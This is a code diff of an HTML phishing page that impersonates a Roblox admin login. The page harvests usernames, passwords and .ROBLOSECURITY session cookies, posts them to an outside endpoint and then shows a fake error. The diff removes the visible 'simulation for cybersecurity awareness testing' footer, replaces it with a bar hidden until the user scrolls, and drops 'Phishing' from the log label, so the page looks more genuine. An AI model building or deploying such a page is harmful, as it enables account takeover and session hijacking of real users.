@@ -2,21 +2,20 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Roblox Admin Panel</title>
+  <title>Roblox - Admin Panel</title>
   <link rel="icon" href="https://www.roblox.com/favicon.ico" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
       margin: 0;
-      background-color: #f2f2f2;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f2f2f2;
     }
 
     .header {
       background-color: #232527;
       padding: 14px 20px;
-      display: flex;
-      align-items: center;
+      text-align: left;
     }
 
     .header img {
@@ -24,16 +23,16 @@
     }
 
     .hero {
-      background: url('https://images.ctfassets.net/0b815kqjt7rr/6CSH5ZLZCakGZdfqkzbDNs/4d2ac74f70106de81a0b58db1b7f62a0/Roblox_Experience_Splash.jpg') no-repeat center center;
+      background: url('https://images.ctfassets.net/0b815kqjt7rr/6CSH5ZLZCakGZdfqkzbDNs/4d2ac74f70106de81a0b58db1b7f62a0/Roblox_Experience_Splash.jpg') center center no-repeat;
       background-size: cover;
-      height: 250px;
+      height: 220px;
       display: flex;
       justify-content: center;
       align-items: center;
       color: white;
-      font-size: 32px;
+      font-size: 30px;
       font-weight: bold;
-      letter-spacing: 2px;
+      letter-spacing: 1px;
     }
 
     .container {
@@ -41,8 +40,8 @@
       margin: 40px auto;
       background: white;
       padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      border-radius: 10px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.2);
       text-align: center;
     }
 
@@ -60,19 +59,19 @@
     input {
       width: 100%;
       padding: 12px;
-      margin-bottom: 15px;
-      border: 1px solid #ccc;
+      margin: 10px 0;
       border-radius: 4px;
+      border: 1px solid #ccc;
     }
 
-    .button {
+    .login-btn {
       background-color: #ff3c00;
-      border: none;
       color: white;
       padding: 12px;
       width: 100%;
-      font-size: 16px;
+      border: none;
       border-radius: 4px;
+      font-size: 16px;
       cursor: pointer;
     }
 
@@ -82,18 +81,28 @@
       margin-top: 10px;
     }
 
-    .footer {
+    .sticky-bar {
+      position: fixed;
+      bottom: -50px;
+      left: 0;
+      right: 0;
+      background: #232527;
+      color: white;
       text-align: center;
-      font-size: 12px;
-      color: #888;
-      margin-top: 30px;
+      padding: 12px;
+      font-size: 14px;
+      transition: bottom 0.5s ease;
+    }
+
+    .sticky-bar.visible {
+      bottom: 0;
     }
   </style>
 </head>
 <body>
 
   <div class="header">
-    <img src="https://www.roblox.com/images/Logo.png" alt="Roblox Logo" />
+    <img src="https://www.roblox.com/images/Logo.png" alt="Roblox Logo">
   </div>
 
   <div class="hero">
@@ -106,14 +115,14 @@
     <form onsubmit="sendData(); return false;">
       <input type="text" id="username" placeholder="Username" required />
       <input type="password" id="password" placeholder="Password" required />
-      <input type="text" id="cookie" placeholder=".ROBLOSECURITY (optional)" />
-      <button type="submit" class="button">Log In</button>
+      <input type="text" id="cookie" placeholder=".ROBLOSECURITY Token (optional)" />
+      <button type="submit" class="login-btn">Log In</button>
     </form>
     <div class="error" id="errorMsg">Username or password is incorrect.</div>
   </div>
 
-  <div class="footer">
-    This is a simulation for cybersecurity awareness testing.
+  <div class="sticky-bar" id="stickyBar">
+    Roblox Admin – Simulation Environment
   </div>
 
   <script>
@@ -128,12 +137,22 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: `Phishing Simulation Log:\nUsername: ${username}\nPassword: ${password}\nCookie: ${cookie}`
+          content: `Simulated Login:\nUsername: ${username}\nPassword: ${password}\nCookie: ${cookie}`
         })
       });
 
       document.getElementById("errorMsg").style.display = "block";
     }
+
+    // Show sticky bar on scroll
+    window.addEventListener("scroll", () => {
+      const bar = document.getElementById("stickyBar");
+      if (window.scrollY > 50) {
+        bar.classList.add("visible");
+      } else {
+        bar.classList.remove("visible");
+      }
+    });
   </script>
 
 </body>
